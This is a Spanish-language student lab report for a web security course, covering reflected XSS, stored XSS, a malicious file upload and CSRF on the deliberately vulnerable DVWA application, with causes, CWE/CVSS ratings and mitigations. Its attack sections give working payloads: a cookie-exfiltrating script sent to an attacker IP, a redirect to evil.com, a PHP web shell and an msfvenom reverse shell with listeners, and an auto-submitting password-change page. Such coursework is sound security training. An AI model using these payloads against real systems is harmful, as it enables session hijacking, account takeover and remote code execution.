# INFORME #1 — Gestión de Vulnerabilidades en Aplicaciones
## DVWA: XSS Reflejado, XSS Almacenado, Upload Backdoor y CSRF

---

| Campo | Detalle |
|---|---|
| **Asignatura** | Gestión de Vulnerabilidades en Aplicaciones |
| **Programa** | Especialización en Ciberseguridad |
| **Docente** | Javier Mauricio Durán Vásquez |
| **Estudiante** | [Nombre y Apellido] |
| **Entorno de prueba** | Kali Linux + Metasploitable (DVWA) |
| **Fecha de entrega** | 28 de febrero de 2026 |
| **Guía** | No. 1 — Laboratorio práctico individual |

---

## Entorno de trabajo

- **Atacante:** Kali Linux — IP: `192.168.x.x` — Prompt: `[nombreapellido]@kali:~$`
- **Víctima:** Metasploitable con DVWA — IP: `192.168.x.x`
- **Nivel de seguridad DVWA:** Low
- **Herramientas utilizadas:** Burp Suite, navegador Firefox, Netcat, msfvenom, Weevely

---

## Vulnerabilidad 1 — XSS Reflejado (Cross-Site Scripting Reflected)

### 1. Descripción de la vulnerabilidad

El XSS Reflejado es una vulnerabilidad en la que el atacante inyecta código JavaScript malicioso en un parámetro de la solicitud HTTP (generalmente la URL o un campo de formulario). El servidor recibe ese input, no lo sanitiza y lo refleja directamente en la respuesta HTML, ejecutándose en el navegador de la víctima en el momento en que esta accede al enlace manipulado.

A diferencia del XSS almacenado, el payload no persiste en la base de datos: vive únicamente en la URL del enlace que el atacante envía a la víctima mediante técnicas de ingeniería social.

---

### 2. Causas de la vulnerabilidad

**a. Ausencia de validaciones**

El servidor no aplica ningún filtro sobre el parámetro `name` antes de interpolarlo en el HTML de respuesta. El siguiente fragmento de código PHP ilustra la debilidad:

```php
// Código vulnerable en DVWA (nivel Low)
$name = $_GET['name'];
echo "<pre>Hello " . $name . "</pre>";
```

Al no existir ninguna función de escape (`htmlspecialchars()`, `htmlentities()`), cualquier etiqueta HTML o script inyectado en `name` se renderiza directamente.

**b. Errores de lógica**

La aplicación confia ciegamente en que el dato enviado por el usuario es texto plano. No distingue entre datos válidos y código ejecutable, lo que representa un error de diseño en la lógica de entrada/salida.

**c. Manejo inadecuado de entradas y salidas**

- **Entrada:** El parámetro `name` no es validado ni sanitizado al recibirse.
- **Salida:** El valor es embebido directamente en el HTML sin aplicar codificación de caracteres especiales (`<`, `>`, `"`, `'`, `&`).

---

### 3. Mecanismo de ataque — Robo de cookie y secuestro de sesión

**Objetivo:** Robar la cookie de sesión de la víctima y cargarla en el navegador del atacante para iniciar sesión sin credenciales.

**Paso 1 — Levantar listener en Kali Linux**

Se inicia un servidor HTTP simple en el atacante para recibir la cookie exfiltrada:

```bash
[nombreapellido]@kali:~$ python3 -m http.server 8888
```

**Paso 2 — Construir el payload**

Se construye un script que lee la cookie de sesión del navegador de la víctima y la envía al servidor del atacante:

```javascript
<script>
  new Image().src = "http://192.168.X.ATACANTE:8888/?cookie=" + document.cookie;
</script>
```

URL maliciosa construida para XSS Reflejado en DVWA:

```
http://192.168.X.VICTIMA/dvwa/vulnerabilities/xss_r/?name=<script>new Image().src="http://192.168.X.ATACANTE:8888/?cookie="+document.cookie;</script>
```

**Paso 3 — La víctima accede al enlace**

Cuando la víctima hace clic en el enlace, su navegador interpreta el script, lee el valor de `document.cookie` y realiza una petición GET al servidor del atacante incluyendo la cookie.

**Paso 4 — Recepción de la cookie**

En la terminal del atacante se observa la solicitud recibida:

```
[nombreapellido]@kali:~$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 ...
192.168.X.VICTIMA - - [27/Feb/2026] "GET /?cookie=PHPSESSID=abc123xyz456 HTTP/1.1" 200 -
```

**Paso 5 — Inyección de la cookie en el atacante**

En el navegador del atacante (Firefox), se abre la consola del desarrollador (`F12` → Consola) y se ejecuta:

```javascript
document.cookie = "PHPSESSID=abc123xyz456";
```

Luego se navega a `http://192.168.X.VICTIMA/dvwa/` y se obtiene acceso autenticado sin ingresar usuario ni contraseña.

> **📸 [CAPTURA 1]:** Vista de la URL maliciosa en el navegador.
> **📸 [CAPTURA 2]:** Terminal del atacante mostrando la cookie recibida (con fecha visible).
> **📸 [CAPTURA 3]:** DVWA con sesión iniciada desde el navegador del atacante usando la cookie robada.

---

### 4. Clasificación técnica

| Clasificación | Referencia |
|---|---|
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') |
| **OWASP Top 10** | A03:2021 – Injection |
| **CVSS v3 (base)** | 6.1 (Medium) — Vector: AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |

---

### 5. Impacto esperado en un sistema real

| Dimensión | Impacto |
|---|---|
| **Confidencialidad** | Alto — Robo de cookies de sesión, tokens de autenticación, datos sensibles visibles en DOM |
| **Integridad** | Medio — Modificación del contenido visible de la página, redirección a sitios falsos (phishing) |
| **Disponibilidad** | Bajo — No afecta directamente la disponibilidad del servicio |

En un entorno real, el atacante podría secuestrar cuentas de usuarios, suplantar su identidad, acceder a información confidencial o realizar acciones en nombre de la víctima (transferencias bancarias, cambios de contraseña, etc.).

---

### 6. Propuesta de mitigación

- **Codificación de salida:** Aplicar `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')` en PHP antes de insertar cualquier dato del usuario en el HTML.
- **Content Security Policy (CSP):** Implementar cabeceras HTTP que restrinjan la ejecución de scripts a fuentes confiables: `Content-Security-Policy: default-src 'self'`.
- **Validación del lado del servidor:** Usar listas blancas de caracteres permitidos para cada campo.
- **Flags en cookies:** Configurar las cookies con `HttpOnly` (impide acceso desde JavaScript) y `Secure` (solo HTTPS).
- **Sanitización con librerías:** Usar DOMPurify (JavaScript) o HTMLPurifier (PHP) para limpiar inputs antes de procesarlos.

---
---

## Vulnerabilidad 2 — XSS Almacenado (Cross-Site Scripting Stored)

### 1. Descripción de la vulnerabilidad

El XSS Almacenado (o Persistente) es una variante del XSS en la que el payload malicioso es guardado permanentemente en la base de datos del servidor (campos de comentarios, mensajes, foros, perfiles). Cada vez que un usuario legítimo carga la página afectada, el script malicioso se ejecuta automáticamente en su navegador, sin necesidad de que el atacante interactúe nuevamente. Esto lo hace más peligroso que el XSS Reflejado, ya que afecta a todos los usuarios que visiten la página comprometida.

---

### 2. Causas de la vulnerabilidad

**a. Ausencia de validaciones**

El código PHP de DVWA almacena directamente en la base de datos lo que el usuario escribe en los campos `name` y `message`, sin sanitización:

```php
// Código vulnerable (nivel Low) — DVWA XSS Stored
$name    = $_POST['txtName'];
$message = $_POST['mtxMessage'];

$query  = "INSERT INTO guestbook (comment, name) VALUES ('$message','$name');";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
```

**b. Errores de lógica**

La aplicación trata los campos del formulario como datos de usuario confiables. No existe ninguna distinción entre texto plano y código HTML/JavaScript en los campos de entrada.

**c. Manejo inadecuado de entradas y salidas**

El dato persiste en la base de datos con el código JavaScript intacto, y al ser recuperado para mostrarse en la página, se inserta sin codificación en el HTML renderizado.

---

### 3. Mecanismo de ataque — Redirección persistente

**Objetivo:** Inyectar en la sección de foros (XSS Stored) un payload que redirija automáticamente a todos los usuarios que accedan a esa funcionalidad hacia un sitio externo (`http://evil.com`).

**Paso 1 — Acceder a XSS (Stored) en DVWA**

Navegar a: `http://192.168.X.VICTIMA/dvwa/vulnerabilities/xss_s/`

**Paso 2 — Construir el payload de redirección**

En el campo **"Message"** se ingresa:

```html
<script>window.location.href='http://evil.com';</script>
```

En el campo **"Name"** se ingresa cualquier valor (ej: `Auditor`). Se hace clic en **"Sign Guestbook"**.

**Paso 3 — Verificar persistencia**

El payload queda almacenado en la base de datos. Cada vez que cualquier usuario (víctima) navegue a la sección XSS Stored, será redirigido automáticamente hacia `http://evil.com` sin posibilidad de interacción.

**Payload con iframe para carga silenciosa:**

```html
<script>
  document.location = "http://192.168.X.ATACANTE/phishing/login.html";
</script>
```

**Verificación en la base de datos (MySQL en Metasploitable):**

```sql
SELECT * FROM dvwa.guestbook;
-- Resultado: el campo comment contiene el script inyectado
```

> **📸 [CAPTURA 4]:** Formulario de XSS Stored con el payload ingresado.
> **📸 [CAPTURA 5]:** Comportamiento de redirección al recargar la página (con fecha visible).
> **📸 [CAPTURA 6]:** Registro en la base de datos con el payload almacenado.

---

### 4. Clasificación técnica

| Clasificación | Referencia |
|---|---|
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |
| **CWE adicional** | CWE-116: Improper Encoding or Escaping of Output |
| **OWASP Top 10** | A03:2021 – Injection |
| **CVSS v3 (base)** | 8.8 (High) — Mayor impacto por ser persistente y afectar múltiples víctimas |

---

### 5. Impacto esperado en un sistema real

| Dimensión | Impacto |
|---|---|
| **Confidencialidad** | Alto — Keylogging, robo masivo de sesiones de todos los usuarios que visiten la página |
| **Integridad** | Alto — Modificación permanente del contenido, distribución de malware |
| **Disponibilidad** | Medio — Redirección masiva o degradación de la experiencia del usuario |

En un escenario real, el atacante podría convertir una sección de comentarios en un vector de distribución de malware a escala, afectando a toda la base de usuarios de la aplicación sin necesidad de enviar ningún enlace.

---

### 6. Propuesta de mitigación

- **Sanitización en almacenamiento:** Aplicar `strip_tags()` y `htmlspecialchars()` antes de insertar datos en la base de datos.
- **Sanitización en recuperación:** Codificar HTML al extraer datos para mostrarlos (`htmlentities()`).
- **Validación de longitud:** Limitar la longitud máxima de campos como "nombre" o "mensaje".
- **WAF (Web Application Firewall):** ModSecurity con reglas OWASP CRS puede detectar y bloquear payloads XSS.
- **CSP (Content Security Policy):** Cabecera HTTP que prohíbe ejecución de scripts inline: `Content-Security-Policy: script-src 'self'`.
- **Prepared Statements:** Separar datos de la lógica de consulta para evitar también SQLi asociado.

---
---

## Vulnerabilidad 3 — Upload Backdoor (File Upload Malicioso)

### 1. Descripción de la vulnerabilidad

La vulnerabilidad de subida de archivos maliciosos ocurre cuando una aplicación permite cargar archivos al servidor sin validar correctamente el tipo, extensión o contenido del archivo. Un atacante puede aprovechar esta debilidad para subir una shell web (backdoor) o un archivo ejecutable que, al ser accedido vía web, le proporcione ejecución remota de comandos (RCE — Remote Code Execution) sobre el servidor víctima.

---

### 2. Causas de la vulnerabilidad

**a. Ausencia de validaciones**

El código PHP vulnerable de DVWA únicamente verifica que se haya subido un archivo, sin validar la extensión real ni el tipo MIME:

```php
// Código vulnerable (nivel Low)
if( isset( $_POST[ 'Upload' ] ) ) {
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        echo '<pre>Your image was not uploaded.</pre>';
    } else {
        echo "<pre>{$target_path} successfully uploaded!</pre>";
    }
}
```

**b. Errores de lógica**

La lógica del sistema asume que el usuario solo subirá imágenes legítimas, sin implementar ninguna restricción técnica que lo garantice.

**c. Manejo inadecuado de entradas y salidas**

El archivo sube con su nombre y extensión originales, sin renombrarlo ni verificar el número mágico (`magic bytes`) del archivo para confirmar que es una imagen real.

---

### 3. Mecanismo de ataque — Subida y ejecución de shell PHP

**Objetivo:** Subir un archivo PHP malicioso y explotarlo para obtener una shell reversa hacia Kali Linux.

**Paso 1 — Crear la web shell PHP**

En Kali Linux se crea el archivo backdoor:

```bash
[nombreapellido]@kali:~$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

O usando `msfvenom` para una reverse shell funcional:

```bash
[nombreapellido]@kali:~$ msfvenom -p php/reverse_php LHOST=192.168.X.ATACANTE LPORT=4444 -f raw > shell.php
```

**Paso 2 — Subir el archivo a DVWA**

Navegar a `http://192.168.X.VICTIMA/dvwa/vulnerabilities/upload/` y usar el formulario para subir `shell.php`. La aplicación acepta el archivo sin restricciones.

**Paso 3 — Iniciar listener en Kali**

```bash
[nombreapellido]@kali:~$ nc -lvnp 4444
```

O usando Metasploit:

```bash
[nombreapellido]@kali:~$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload php/reverse_php
msf6 exploit(multi/handler) > set LHOST 192.168.X.ATACANTE
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

**Paso 4 — Ejecutar el backdoor**

Navegar en el navegador a la ruta donde se subió el archivo:

```
http://192.168.X.VICTIMA/dvwa/hackable/uploads/shell.php
```

**Paso 5 — Sesión de consola obtenida**

El listener recibe la conexión reversa:

```bash
[nombreapellido]@kali:~$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.X.VICTIMA XXXX
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
cat /etc/passwd
```

La shell web también puede usarse para comandos directos por URL:

```
http://192.168.X.VICTIMA/dvwa/hackable/uploads/shell.php?cmd=whoami
```

> **📸 [CAPTURA 7]:** Formulario de upload con shell.php seleccionado.
> **📸 [CAPTURA 8]:** Mensaje de confirmación de subida exitosa (con fecha visible).
> **📸 [CAPTURA 9]:** Terminal Kali con la sesión reversa activa mostrando comandos ejecutados.

---

### 4. Clasificación técnica

| Clasificación | Referencia |
|---|---|
| **CWE** | CWE-434: Unrestricted Upload of File with Dangerous Type |
| **CWE adicional** | CWE-552: Files or Directories Accessible to External Parties |
| **CVE ejemplo** | CVE-2014-4943 (vulnerabilidad similar en aplicaciones PHP) |
| **OWASP Top 10** | A04:2021 – Insecure Design / A05:2021 – Security Misconfiguration |
| **CVSS v3 (base)** | 9.8 (Critical) — Ejecución remota de código sin autenticación previa |

---

### 5. Impacto esperado en un sistema real

| Dimensión | Impacto |
|---|---|
| **Confidencialidad** | Crítico — Acceso completo al sistema de archivos del servidor, lectura de credenciales, bases de datos |
| **Integridad** | Crítico — Modificación o eliminación de archivos, defacement, instalación de malware persistente |
| **Disponibilidad** | Crítico — Posibilidad de apagar servicios, ransomware, denegación de servicio |

Este ataque representa uno de los vectores más críticos, ya que el atacante obtiene ejecución de código en el servidor con los permisos del proceso web (`www-data`), pudiendo escalar privilegios posteriormente.

---

### 6. Propuesta de mitigación

- **Validación de tipo MIME real:** Verificar los magic bytes del archivo, no solo la extensión o el tipo MIME declarado por el cliente.
- **Lista blanca de extensiones:** Permitir únicamente extensiones seguras (`.jpg`, `.png`, `.gif`).
- **Renombrar archivos:** Generar un nombre aleatorio al guardar el archivo, eliminando la extensión original.
- **Almacenamiento fuera del webroot:** Guardar archivos en un directorio no accesible directamente por el servidor web.
- **Content-Type de descarga:** Servir los archivos con `Content-Disposition: attachment` para evitar su ejecución.
- **Antivirus/Sandbox:** Escanear archivos subidos antes de almacenarlos o servirlos.
- **Limitar tamaño:** Restringir el tamaño máximo del archivo para evitar ataques DoS.

---
---

## Vulnerabilidad 4 — CSRF (Cross-Site Request Forgery)

### 1. Descripción de la vulnerabilidad

CSRF (Cross-Site Request Forgery o Falsificación de Peticiones en Sitios Cruzados) es un ataque en el que el atacante induce a una víctima autenticada a realizar una acción no deseada en una aplicación web en la que tiene sesión activa. El navegador de la víctima envía automáticamente las cookies de sesión con cada solicitud, por lo que la aplicación vulnerable cree que la petición es legítima aunque haya sido forjada por el atacante desde otro sitio.

---

### 2. Causas de la vulnerabilidad

**a. Ausencia de validaciones**

El código PHP de DVWA para cambio de contraseña no verifica ningún token CSRF ni valida el origen de la petición:

```php
// Código vulnerable (nivel Low) — Change Password
if( isset( $_GET[ 'Change' ] ) ) {
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    if( $pass_new == $pass_conf ) {
        $pass_new = md5( $pass_new );
        $insert = "UPDATE `users` SET password = '$pass_new'
                   WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"], $insert);
        echo "<pre>Password Changed.</pre>";
    }
}
```

**b. Errores de lógica**

La aplicación no exige que la petición provenga de una página del propio sitio, ni que el usuario haya iniciado explícitamente la acción.

**c. Manejo inadecuado de entradas y salidas**

Los parámetros sensibles (`password_new`, `password_conf`) viajan en la URL (método GET), lo que facilita la construcción de enlaces maliciosos y los registra en logs y cachés.

---

### 3. Mecanismo de ataque — Cambio de contraseña de la víctima

**Objetivo:** Falsificar una petición que cambie la contraseña del usuario víctima sin su conocimiento ni su interacción directa con el formulario.

**Paso 1 — Identificar la petición legítima**

Usando Burp Suite, se intercepta la petición de cambio de contraseña en DVWA:

```
GET /dvwa/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change HTTP/1.1
Host: 192.168.X.VICTIMA
Cookie: PHPSESSID=abc123xyz456; security=low
```

**Paso 2 — Construir la página de ataque**

El atacante crea un archivo HTML malicioso (`csrf_attack.html`) que, al cargarse en el navegador de la víctima, envía automáticamente la petición de cambio de contraseña:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Oferta Especial - Gana un iPhone!</title>
</head>
<body onload="document.forms[0].submit()">
  <form action="http://192.168.X.VICTIMA/dvwa/vulnerabilities/csrf/"
        method="GET"
        style="display:none;">
    <input type="hidden" name="password_new"  value="hackeado123" />
    <input type="hidden" name="password_conf" value="hackeado123" />
    <input type="hidden" name="Change"        value="Change" />
  </form>
  <h1>Cargando tu premio...</h1>
</body>
</html>
```

**Alternativa con imagen invisible (1x1 pixel):**

```html
<img src="http://192.168.X.VICTIMA/dvwa/vulnerabilities/csrf/?password_new=hackeado123&password_conf=hackeado123&Change=Change" width="1" height="1" />
```

**Paso 3 — Enviar el enlace a la víctima**

El atacante sirve el archivo malicioso desde su servidor:

```bash
[nombreapellido]@kali:~$ python3 -m http.server 80
```

Luego envía a la víctima un enlace hacia `http://192.168.X.ATACANTE/csrf_attack.html` mediante correo, chat o enlace embebido.

**Paso 4 — Ejecución silenciosa**

Cuando la víctima (con sesión activa en DVWA) abre el enlace, el navegador envía automáticamente la petición GET con sus cookies de sesión. El servidor cambia la contraseña a `hackeado123`.

**Paso 5 — Verificación**

El atacante intenta iniciar sesión en DVWA con `admin / hackeado123` y obtiene acceso exitoso.

> **📸 [CAPTURA 10]:** Archivo HTML malicioso y petición interceptada con Burp Suite.
> **📸 [CAPTURA 11]:** Respuesta del servidor confirmando el cambio de contraseña (con fecha visible).
> **📸 [CAPTURA 12]:** Login exitoso con la nueva contraseña establecida por el atacante.

---

### 4. Clasificación técnica

| Clasificación | Referencia |
|---|---|
| **CWE** | CWE-352: Cross-Site Request Forgery (CSRF) |
| **CWE adicional** | CWE-346: Origin Validation Error |
| **OWASP Top 10** | A01:2021 – Broken Access Control |
| **CVSS v3 (base)** | 8.8 (High) — Vector: AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |

---

### 5. Impacto esperado en un sistema real

| Dimensión | Impacto |
|---|---|
| **Confidencialidad** | Alto — Acceso no autorizado a la cuenta de la víctima tras el cambio de credenciales |
| **Integridad** | Alto — Modificación de datos de la víctima (contraseñas, configuraciones, pedidos, transacciones) |
| **Disponibilidad** | Medio — Bloqueo de la cuenta legítima al cambiarle el acceso |

En aplicaciones bancarias o de comercio electrónico, CSRF puede usarse para realizar transferencias, compras o cambios de configuración crítica en nombre de la víctima, con consecuencias económicas directas.

---

### 6. Propuesta de mitigación

- **Token CSRF (Synchronizer Token Pattern):** Generar un token único, secreto e impredecible por sesión y validarlo en cada petición de cambio de estado del servidor.
- **SameSite Cookie Attribute:** Configurar las cookies con `SameSite=Strict` o `SameSite=Lax` para que no se envíen en solicitudes de origen cruzado.
- **Verificación del encabezado `Origin/Referer`:** Validar que la solicitud provenga del mismo dominio de la aplicación.
- **Re-autenticación para acciones críticas:** Solicitar la contraseña actual antes de permitir cambiarla.
- **Método POST para operaciones sensibles:** Evitar operaciones de cambio de estado mediante GET, ya que estas son trivialmente explotables con imágenes o iframes.
- **Double Submit Cookie:** Enviar el token CSRF tanto en la cookie como en un parámetro oculto del formulario.

---
---

## Reflexión Personal

Durante el desarrollo de este laboratorio, asumiendo el rol de auditor de seguridad y pentester ético sobre la plataforma DVWA, se evidenció de manera práctica cómo vulnerabilidades aparentemente simples en el código de una aplicación web pueden derivar en compromisos críticos de la seguridad de un sistema real.

La experiencia más reveladora fue comprender que ninguna de las cuatro vulnerabilidades trabajadas requiere sofisticación técnica extrema para ser explotada: todas aprovechan errores fundamentales de diseño que podrían prevenirse con prácticas básicas de programación segura. El **XSS Reflejado** y el **XSS Almacenado** se originan en la misma causa raíz: confiar en el input del usuario sin codificación de salida; sin embargo, el impacto del XSS Almacenado es significativamente mayor por su persistencia y escala.

El laboratorio de **Upload Backdoor** fue el de mayor impacto tangible, ya que en cuestión de minutos se obtuvo ejecución remota de comandos sobre el servidor víctima, lo que en un entorno productivo implicaría el compromiso total del sistema. Esto refuerza la necesidad crítica de validar los archivos subidos por usuarios en cualquier plataforma web.

El ataque **CSRF** resultó ser el más "silencioso" de todos: la víctima no percibe ninguna señal de alerta, no requiere que el atacante interactúe directamente con la aplicación y explota la confianza implícita que el navegador deposita en las cookies de sesión. Su mitigación con tokens CSRF es sencilla pero frecuentemente omitida en desarrollos ágiles.

En términos de aplicabilidad profesional, estas prácticas refuerzan la importancia de integrar la seguridad desde las etapas tempranas del ciclo de desarrollo de software (DevSecOps), realizar pruebas de penetración periódicas y educar a los equipos de desarrollo en los principios de OWASP. Un auditor de seguridad que comprende la mecánica de estos ataques está mejor preparado para proponer controles preventivos eficaces y defender aplicaciones web en entornos reales.

---

## Referencias

1. OWASP Foundation. (2021). *OWASP Top Ten 2021*. https://owasp.org/www-project-top-ten/
2. MITRE Corporation. (2024). *CWE-79: Cross-site Scripting*. https://cwe.mitre.org/data/definitions/79.html
3. MITRE Corporation. (2024). *CWE-352: Cross-Site Request Forgery*. https://cwe.mitre.org/data/definitions/352.html
4. MITRE Corporation. (2024). *CWE-434: Unrestricted Upload of File with Dangerous Type*. https://cwe.mitre.org/data/definitions/434.html
5. PortSwigger. (2024). *Web Security Academy — XSS*. https://portswigger.net/web-security/cross-site-scripting
6. PortSwigger. (2024). *Web Security Academy — CSRF*. https://portswigger.net/web-security/csrf
7. Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook*. Wiley.
8. Durán Vásquez, J. M. (2026). *Guía de Trabajo Práctico No. 1 — Gestión de Vulnerabilidades en Aplicaciones*. ITM.

---

> ⚠️ **Nota:** Las capturas de pantalla (indicadas como `📸 [CAPTURA N]`) deben ser reemplazadas con las capturas reales obtenidas durante la práctica, mostrando la fecha del sistema visible y el prompt personalizado `[nombreapellido]@kali:~$` según los requisitos de la guía.

---
*Informe generado el 27/02/2026 — Entrega: 28/02/2026*
